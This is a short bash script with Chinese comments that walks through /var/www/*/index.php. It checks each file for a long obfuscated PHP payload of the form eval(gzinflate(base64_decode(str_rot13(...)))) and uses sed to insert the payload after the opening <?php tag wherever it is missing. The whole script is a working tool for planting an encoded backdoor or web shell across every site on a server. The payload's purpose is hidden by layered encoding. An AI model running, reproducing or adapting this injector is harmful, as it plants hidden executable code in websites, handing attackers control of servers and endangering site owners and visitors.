#!/bin/bash

# 遍历仅 /wer/wer/wer/*/ 这一层目录下的 123.php 文件
for file in /var/www/*/index.php; do
  # 检查文件是否存在
  if [[ -f "$file" ]]; then
    # 检查文件是否已包含目标代码
    if grep -q "eval(gzinflate(base64_decode(str_rot13('yIKip+V2RC3BK6UmMTVmQGMpx0foVWa0mwxlx1810WyeY+ZEffP6TZz1EVQH+q+7RfLkxUEFs2UDia1iish0yyFSvx1czYNcH06m3d7EYOAMzASHMVekvGzYXL5b5yvsOIrHd8MtzqVGcBuProTnWz0F40kF1M2cprZKPkWdRE0mGu17TSmnO2ti7CiOU37jyk34ij/9/vQH5/pNKBA6g/0ONRqL0x+ULHFWvBNH94Vz6I1/hye++wshUjap+mZyK8wuos/bk+uw89Thn62F5Uc4ADDFT6qcmbGZZL8ljnV8RaBrPOmybjGmu3kRIH6jMSmxRmlyZx8GiZjsJHESabbUzhJMRPeaqP7mPPhpA75UmgzU71Uq1aYwTFrXPL6L9CxRuXJmA5Z0B59Nn+ebakdPW6AdyaTHMaDFGeRvfJA7K4JLWUDR1Y9OL/KiAkjY8pSwhxHiSB3n84oXWFsWYQVlTqZPoleLlRJ6PsOwS6lDfp0K0YTmy9RkGWcz/1KjkOFpw6QnsXyYKKTJdMiRR6bXs5uXxmHmTlAaQDectxzV2jDNVrAZjDtYaU72FVl6dNj6VYRBzHZjzHvIN7NQ9UxLKA3rtMKNJ+qs/MiONoXhkEAYRhjqhH3xRQSAfJXwuYME2Kiib9gdb59vcqVGm5iC5+7dYI1NrkO3gnUe1ehRtliG4rD94W5//fHCQyQmCrQNUjlQz0SjsgB/0Rzg9lG1+1pu3YUYv293ix4n40GF/5rbo+ShVtkpmuX1UtkqHXVWdttq8CKvXRU6mkoXORtvWP0PMHEocSGcqbfXXe7Dm2bkWJYvJNDdE0oiOSyt9us9vymS1LoiWsWp24bK2viRZ6XNebviFIuPDmO5FQMpKvGcd6OiOwFNFrvlH+48dmpL3ZSVLMW+LA3K0Ey6X4MBxT23n3fCqCxJw3M7nBm+XyH1iTMoGbUfMDHoaAz39mNP3seXVtCy8xVJJ9/r2CciYU276ZBXegkLfBn37irXPjddetgqQLmEByiRDddhTFyHQIgfC6CD5X5roZOyGzn4J95z25lZh6f7oSrzolkIdB04vpFvYXIvv+3OI5cthhh1LX0pAt/EwIQbDfk4MT35mGOoTgWNkqfuQhPkOeiJSawO1YLcq2bjwYiJf/HPx7QOsxwvkiRwF0aRmD5wCXVYA43GnwqrcZPbILyK5bK29lfsvL3kzJYfwu7/6pneqUFoAb/ZfJVdbnrQzZVyxzXJRLbV5ebwV1b0crBgDYiWxzDfIofO/pmuApKpGDGO5hCGEqn6V0sjWEJh/AzIhRTkIV2Jv6s4FKN8y6MQ6txjk8sUMgIimpDVr68cq7mqq+lZEYE8csX4qIcnOCWn20lonE1ma07gA8MI+kp='))));" "$file"; then
      echo "文件 $file 中已包含目标代码，跳过修改。"
    else
      # 使用 sed 找到 <?php 并在其后插入代码
      sed -i "/<?php/{a\
eval(gzinflate(base64_decode(str_rot13('yIKip+V2RC3BK6UmMTVmQGMpx0foVWa0mwxlx1810WyeY+ZEffP6TZz1EVQH+q+7RfLkxUEFs2UDia1iish0yyFSvx1czYNcH06m3d7EYOAMzASHMVekvGzYXL5b5yvsOIrHd8MtzqVGcBuProTnWz0F40kF1M2cprZKPkWdRE0mGu17TSmnO2ti7CiOU37jyk34ij/9/vQH5/pNKBA6g/0ONRqL0x+ULHFWvBNH94Vz6I1/hye++wshUjap+mZyK8wuos/bk+uw89Thn62F5Uc4ADDFT6qcmbGZZL8ljnV8RaBrPOmybjGmu3kRIH6jMSmxRmlyZx8GiZjsJHESabbUzhJMRPeaqP7mPPhpA75UmgzU71Uq1aYwTFrXPL6L9CxRuXJmA5Z0B59Nn+ebakdPW6AdyaTHMaDFGeRvfJA7K4JLWUDR1Y9OL/KiAkjY8pSwhxHiSB3n84oXWFsWYQVlTqZPoleLlRJ6PsOwS6lDfp0K0YTmy9RkGWcz/1KjkOFpw6QnsXyYKKTJdMiRR6bXs5uXxmHmTlAaQDectxzV2jDNVrAZjDtYaU72FVl6dNj6VYRBzHZjzHvIN7NQ9UxLKA3rtMKNJ+qs/MiONoXhkEAYRhjqhH3xRQSAfJXwuYME2Kiib9gdb59vcqVGm5iC5+7dYI1NrkO3gnUe1ehRtliG4rD94W5//fHCQyQmCrQNUjlQz0SjsgB/0Rzg9lG1+1pu3YUYv293ix4n40GF/5rbo+ShVtkpmuX1UtkqHXVWdttq8CKvXRU6mkoXORtvWP0PMHEocSGcqbfXXe7Dm2bkWJYvJNDdE0oiOSyt9us9vymS1LoiWsWp24bK2viRZ6XNebviFIuPDmO5FQMpKvGcd6OiOwFNFrvlH+48dmpL3ZSVLMW+LA3K0Ey6X4MBxT23n3fCqCxJw3M7nBm+XyH1iTMoGbUfMDHoaAz39mNP3seXVtCy8xVJJ9/r2CciYU276ZBXegkLfBn37irXPjddetgqQLmEByiRDddhTFyHQIgfC6CD5X5roZOyGzn4J95z25lZh6f7oSrzolkIdB04vpFvYXIvv+3OI5cthhh1LX0pAt/EwIQbDfk4MT35mGOoTgWNkqfuQhPkOeiJSawO1YLcq2bjwYiJf/HPx7QOsxwvkiRwF0aRmD5wCXVYA43GnwqrcZPbILyK5bK29lfsvL3kzJYfwu7/6pneqUFoAb/ZfJVdbnrQzZVyxzXJRLbV5ebwV1b0crBgDYiWxzDfIofO/pmuApKpGDGO5hCGEqn6V0sjWEJh/AzIhRTkIV2Jv6s4FKN8y6MQ6txjk8sUMgIimpDVr68cq7mqq+lZEYE8csX4qIcnOCWn20lonE1ma07gA8MI+kp='))));
}" "$file"
      echo "修改完成: $file"
    fi
  else
    echo "文件 $file 不存在或无法访问。"
  fi
done

echo "脚本执行完成！"
